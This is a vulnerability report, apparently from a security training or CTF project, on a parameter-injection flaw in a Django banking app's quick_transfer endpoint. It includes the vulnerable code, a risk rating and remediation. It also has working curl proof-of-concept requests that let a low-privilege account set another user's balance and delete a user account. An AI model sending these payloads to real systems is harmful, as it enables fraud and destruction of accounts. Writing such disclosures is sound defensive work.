# Description

**CWE-74: Improper Neutralization of Special Elements in Output** (injection into a downstream protocol)

The `quick_transfer` view accepts an arbitrary JSON object from the client and forwards it to the banking socket backend. A default `command` and the active `sid` are set first, and then the entire client-supplied dictionary is merged over them. Because the merge happens last, the client controls every field of the backend protocol message, including `command`, `sid`, and every per-command argument such as `user_id` and `amount`. No allow-list of fields or commands is applied.

Vulnerable code (`D:\Documents\WOCSA\WOCShAck\WOCShAck#5\wocshack\djangoWocshack_5\Bank\views.py`):

```python
# Bank/views.py:421-440
@csrf_exempt                                                  # line 421
@login_required()                                             # line 422
def quick_transfer(request):                                  # line 423
    try:
        data = json.loads(request.body)                       # line 425
    except (json.JSONDecodeError, Exception):
        return JsonResponse({"error": "invalid JSON"}, status=400)
    cli, sid = make_connection()                              # line 428
    if cli is not False and cli is not None:
        payload = {"command": data.get("action", "tr"), "sid": sid}   # line 430
        payload.update(data)                                  # line 431  <-- client overrides any field
        cli.send(payload)                                     # line 432
        response = cli.receive()                              # line 433
        ...
        return JsonResponse(response or {"error": "no response"})
    return JsonResponse({"error": "unavailable"})
```

Route: `D:\Documents\WOCSA\WOCShAck\WOCShAck#5\wocshack\djangoWocshack_5\Bank\urls.py:63`
(`path("api/quick-transfer/", views.quick_transfer, name="bank_quick_transfer")`), mounted under `/banking/`.

Why this is exploitable:

- `payload.update(data)` lets the client replace `command`, so any command the backend parser understands is reachable, including ones with no Django wrapper.
- The backend parser (`D:\Documents\WOCSA\WOCShAck\WOCShAck#5\wocshack\VRC_Banking_System_Backend\Utils\parser.py`) dispatches on `command`: `delu` at line 500, `sb` at line 510. Its handlers `delete_user` (line 170) and `set_balance` (line 419) act directly on the `user_id` they receive.
- The backend only checks that the `sid` exists in its session table (`parser.py:488`). It has no notion of which Django user owns the request, and it does not check whether the caller is an administrator. Any logged-in user can open a session with `make_connection()` and then issue privileged commands.
- The view is `@csrf_exempt`, so the endpoint is also reachable cross-site from a victim's browser session.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Register or use any low-privilege account (e.g. `john`) and log in at `/account/login/`, saving the session cookie to `john.cookies`. | Authenticated session cookie obtained. |
| 2 | Send `POST /banking/api/quick-transfer/` with body `{"action": "sb", "user_id": 1, "amount": 999999999}`. | Django builds `{"command": "sb", "sid": <new>}`, then `update(data)` adds `action`, `user_id` and `amount` to the payload. The backend runs `set_balance` for user 1 and returns `{"status": "success"}`. |
| 3 | Send `POST /banking/api/quick-transfer/` with body `{"action": "delu", "user_id": 2}`. | The backend runs `delete_user` for user 2 and returns `{"status": "success"}`. The victim account is removed. |
| 4 | Send the same request with `{"command": "sb", ...}` directly instead of `action`. | Also accepted, because `update(data)` overrides the default `command` regardless of how it is supplied. |

Note on step 2 and 3: the `command` key is set by the view's default from `action`, but the merge means the attacker can also set `command` directly. Using `action` is the documented form.

# PoC

```bash
# 0) Log in and store the session cookie (the login form field names depend on the Account app)
curl -s -c john.cookies -b john.cookies http://localhost:8000/account/login/ -o /dev/null
curl -s -c john.cookies -b john.cookies -X POST http://localhost:8000/account/login/ \
  -d "username=john&password=<password>"

# 1) Set user 1's balance to 999,999,999 (balance manipulation)
curl -s -b john.cookies -X POST http://localhost:8000/banking/api/quick-transfer/ \
  -H "Content-Type: application/json" \
  -d '{"action":"sb","user_id":1,"amount":999999999}'
# -> {"status": "success"}

# 2) Delete user 2 (arbitrary user deletion)
curl -s -b john.cookies -X POST http://localhost:8000/banking/api/quick-transfer/ \
  -H "Content-Type: application/json" \
  -d '{"action":"delu","user_id":2}'
# -> {"status": "success"}

# 3) Equivalent form that overrides the command field directly
curl -s -b john.cookies -X POST http://localhost:8000/banking/api/quick-transfer/ \
  -H "Content-Type: application/json" \
  -d '{"command":"sb","user_id":1,"amount":1}'
# -> {"status": "success"}
```

Expected result: user 1's balance is set to 999,999,999 and user 2 no longer exists. Both actions are performed by a non-admin account.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Low to moderate directly. The request/response channel returns only status fields for `sb` and `delu`. Other backend commands (for example `getu`) could return user data through the same channel, which is not demonstrated here. |
| Integrity | High. Any authenticated user can set any account's balance and rewrite arbitrary backend state. |
| Availability | High. Any authenticated user can delete any user account. |

Overall severity: **Critical** (CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, score 9.1) — the attack is network-reachable, needs only a low-privilege account, and directly allows arbitrary balance changes and account deletion across all users with no user interaction.

# Remediation

1. Stop merging client input into the backend payload. Build the payload from an explicit allow-list of commands and fields, and take `user_id` from `request.user.id` rather than from the request body:

   ```python
   ACTIONS = {
       "tr": {"from_id", "to_id", "amount"},
       # privileged commands are omitted entirely for non-admin callers
   }
   cmd = data.get("action")
   if cmd not in ACTIONS:
       return JsonResponse({"error": "unsupported"}, status=400)
   payload = {"command": cmd, "sid": sid, "user_id": request.user.id}
   for k in ACTIONS[cmd]:
       if k in data:
           payload[k] = data[k]
   ```

2. Never let the client set `command` or `sid`. Derive `sid` on the server and ignore any value supplied in the body.
3. Enforce authorization on the backend, not only in the Django layer: `sb`, `delu`, `sp`, and similar administrative commands should require an admin role bound to the session, and the backend should check that the operation's target belongs to the caller.
4. Remove `@csrf_exempt` from `quick_transfer` and require a CSRF token for state-changing requests.
5. Restrict or remove the administrative commands from the banking parser entirely if no legitimate Django path needs them.

# Author
WOCSA
